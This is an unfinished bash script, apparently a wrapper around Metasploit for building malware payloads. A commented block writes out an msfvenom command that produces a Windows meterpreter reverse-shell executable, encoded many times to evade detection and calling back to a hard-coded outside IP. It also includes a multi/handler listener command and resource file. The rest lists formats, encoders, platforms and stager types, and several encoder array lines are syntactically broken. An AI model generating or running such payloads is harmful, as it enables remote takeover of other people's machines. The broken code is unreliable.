#!/usr/bin/env bash

#SCRIPT,COMMAND LINE,SCRIPT
: '

msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.86.35.02 LPORT=1337 -a x86 -f exe -e x86/shikata_ga_nai -i 30 -n 3000 -t 600 -o wintest.exe


msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_tcp; set LHOST 172.86.35.02; set LPORT 1337; run"


cat <<'EOF' > listener.rc 
use exploit/multi/handler 
set PAYLOAD windows/meterpreter_reverse_tcp 
set LHOST=172.86.35.02 
set LPORT=1337
set ExitOnSession false
set EnableStageEncoding true
run -j
EOF

'

# TXT FILES
android="android.msf"
apple="apple.msf"
bsd="bsd.msf"
firefox="firefox.msf"
linux="linux.msf"
osx="osx.msf"
windows="windows.msf"
program_language="program_languages.msf"
LHOST=""
LPORT=""

declare -a FORMAT
declare -a ENCRYPT
declare -a PLATFORM
declare -a ARCH
declare -a NOPS

FORMAT=( "aspx" "base32" "base64" "bash" "c" "csharp" "dll" "ducky-script-psh" "exe" "elf" "go" "golang" "hex" "hta-psh" "jar" "java" "perl" "powershell" "ps1" "py" "python" "raw" "ruby" "rust" "sh" "vbscript" "war" "psh" )

ENCRYPT=( "aes256" "base64" "rc4" "xor" )

PLATFORM=( "windows" "ruby" "python" "php" "nodejs" "osx" "multi" "linux" "unix" "java" "javascript" "freebsd" "apple_ios" "android" "firefox" "unknown"  )

ARCH=( "aarch64" "armbe" "armle" 'cmd' "dalvik" "firefox" "java" "nodejs" 'php' "python" 'ruby' "sparc" "sparc64" "x64" "x86" "x86_64" "zarch" )

NOPS=( "aarch64/simple" "armle/simple" "cmd/generic" "mipsbe/better" "php/generic" "php/simple" "x64/simple" "x86/opty2" "x86/single_byte" )

# ENCODERS
X64=( [xor]="x64/xor" )
X86=( [alpha_mixed]"x86/alpha_mixed" [alpha_upper]="x86/alpha_upper" [dword]="x86/call4_dword_xor" **[shikata_ga_nai]="x86/shikata_ga_nai" )
RUBY=( *ALL GOOD [base64]="ruby/base64" )
PHP=( *ALL GOOD [base64]="php/base64" [hex]="php/hex" [minify]="php/minify" )
CMD=( [base64]="cmd/base64" [brace]="cmd/brace" [echo]="cmd/echo" [ifs]="cmd/ifs" [perl]="cmd/perl" **[pwshb64]="cmd/powershell_base64" )



# METERPRETER TCP Staged X meterpreter/bind_tcp - meterpreter/reverse_tcp

# METERPRETER TCP Stageless X meterpreter_bind_tcp - meterpreter_reverse_tcp

# METERPRETER HTTP Staged X meterpreter/bind_http - meterpreter/reverse_http

# METERPRETER HTTP Stageless X meterpreter_bind_http - meterpreter_reverse_http

# SHELL TCP Staged X shell/bind_tcp - shell/reverse_tcp

# SHELL TCP Stageless X shell_reverse_tcp - shell_bind_tcp


